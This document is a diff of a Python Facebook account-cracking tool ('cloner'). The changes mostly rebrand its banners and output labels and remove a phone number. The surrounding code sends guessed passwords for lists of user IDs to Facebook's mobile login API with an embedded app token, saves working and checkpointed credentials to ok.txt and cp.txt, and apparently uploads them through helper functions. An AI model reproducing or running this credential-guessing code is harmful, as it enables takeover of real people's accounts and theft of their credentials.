@@ -107,12 +107,12 @@ ___  ___          _____ _           _
 
 ┌───────────────────────────────────────┐
 \033[1;33m│ [✓] AUTHOR  
-    RAHUL THAKUR 707\033[1;32m[RAHUL]         │
+    RAHUL THAKUR 707\033[1;32m[BRAND]         │
 \033[1;34m│ [✓] GITHUB   : \033[41m\033[1;37m |Rahulthakur12\x1b[0m           │
-\033[1;35m│ [✓] WHATSAPP :  9582492941           │
+\033[1;35m│ [✓] WHATSAPP :  THAKUR NAAM NAHI BRAND HAI_🤞🍂      │
 \033[1;36m│ [✓] RAHUL THAKUR: \x1b[1;32mPRO PRONOY\x1b[1;97m           │
 \033[1;32m└───────────────────────────────────────┘  
-         \033[41m\033[1;37m𝐓𝐎𝐎𝐋 𝐀𝐃𝐌𝐈𝐍 [RAHUL] [pÏඋඋħÏ]\x1b[0m    
+         \033[41m\033[1;37m𝐓𝐎𝐎𝐋 𝐀𝐃𝐌𝐈𝐍 [RAHUL] [BRAND]\x1b[0m    
  """)
 		print("%s [%s•%s] %sTOOL NAME : %sRAHUL THAKUR ❌ PROO CLONER❌"%(G,R,G,B,G))
 		print("%s [%s•%s] %sVERSION   : %s0.118.0"%(G,R,G,B,G))
@@ -246,8 +246,8 @@ ___  ___          _____ _           _
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
-				print("\n%s [+] OK Rahul thakur 12-> ok.txt"%(G))
-				print("%s [+] CP Rahul thakur 12-> cp.txt"%(Y))
+				print("\n%s [+] OK THAKURBRAND 12-> ok.txt"%(G))
+				print("%s [+] CP THAKURBRAND 12-> cp.txt"%(Y))
 				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
@@ -276,8 +276,8 @@ ___  ___          _____ _           _
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
-				print("\n%s [+] OK Rahul thakur 12-> ok.txt"%(G))
-				print("%s [+] CP Rahul thakur 12-> cp.txt"%(R))
+				print("\n%s [+] OK THAKURBRAND 12-> ok.txt"%(G))
+				print("%s [+] CP THAKURBRAND 12-> cp.txt"%(R))
 				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
@@ -306,8 +306,8 @@ ___  ___          _____ _           _
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
-				print("\n%s [+] OK Rahul thakur 12-> ok.txt"%(G))
-				print("%s [+] CP Rahul thakur 12-> cp.txt"%(Y))
+				print("\n%s [+] OK THAKURBRAND 12-> ok.txt"%(G))
+				print("%s [+] CP THAKURBRAND 12-> cp.txt"%(Y))
 				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
@@ -336,8 +336,8 @@ ___  ___          _____ _           _
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
-				print("\n%s [+] OK Rahul thakur 12-> ok.txt"%(G))
-				print("%s [+] CP Rahul thakur 12-> cp.txt"%(Y))
+				print("\n%s [+] OK THAKURBRAND 12-> ok.txt"%(G))
+				print("%s [+] CP THAKURBRAND 12-> cp.txt"%(Y))
 				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
@@ -366,8 +366,8 @@ ___  ___          _____ _           _
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
-				print("\n%s [+] OK Rahul thakur 12-> ok.txt"%(G))
-				print("%s [+] CP Rahul thakur 12-> cp.txt"%(Y))
+				print("\n%s [+] OK THAKURBRAND 12-> ok.txt"%(G))
+				print("%s [+] CP THAKURBRAND 12-> cp.txt"%(Y))
 				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
@@ -396,8 +396,8 @@ ___  ___          _____ _           _
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
-				print("\n%s [+] OK Rahul thakur 12-> ok.txt"%(G))
-				print("%s [+] CP Rahul thakur 12-> cp.txt"%(Y))
+				print("\n%s [+] OK THAKURBRAND 12-> ok.txt"%(G))
+				print("%s [+] CP THAKURBRAND 12-> cp.txt"%(Y))
 				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
@@ -429,8 +429,8 @@ ___  ___          _____ _           _
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
-				print("\n%s [+] OK Rahul thakur-> ok.txt"%(G))
-				print("%s [+] CP Rahul thakur-> cp.txt"%(Y))
+				print("\n%s [+] OK THAKURBRAND-> ok.txt"%(G))
+				print("%s [+] CP THAKURBRAND-> cp.txt"%(Y))
 				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
@@ -458,8 +458,8 @@ ___  ___          _____ _           _
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
-				print("\n%s [+] OK Rahul thakur-> ok.txt"%(G))
-				print("%s [+] CP Rahul thakur-> cp.txt"%(Y))
+				print("\n%s [+] OK THAKURBRAND-> ok.txt"%(G))
+				print("%s [+] CP THAKURBRAND-> cp.txt"%(Y))
 				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
@@ -475,7 +475,7 @@ ___  ___          _____ _           _
 			"Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36;]"
 		])
 		sys.stdout.write(
-			"\r\r %s[>_] [rahul] : %s/%s -> \033[0;92m [ RAHUL-OK:%s ]- \033[0;91m[RAHUL-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
+			"\r\r %s[>_] [THAKUR] : %s/%s -> \033[0;92m [ THAKURBRAND-OK:%s ]- \033[0;91m[THAKURBRAND-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -492,15 +492,15 @@ ___  ___          _____ _           _
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[RAHUL-OK] %s|%s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[THAKURBRAND-OK] %s|%s\033[0;97m         "%(uid, pw))
 				self.ok.append("%s|%s"%(uid, pw))
-				open("ok.txt","a").write(" [RAHUL-OK] %s|%s\n"%(uid, pw))
+				open("ok.txt","a").write(" [THAKURBRAND-OK] %s|%s\n"%(uid, pw))
 				uploadoks()
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;91m[RAHUL-CP] %s|%s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;91m[THAKURBRAND-CP] %s|%s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("cp.txt","a").write(" [RAHUL-CP] %s|%s\n"%(uid, pw))
+				open("cp.txt","a").write(" [THAKURBRAND-CP] %s|%s\n"%(uid, pw))
 				uploadcps()
 				break
 			else:
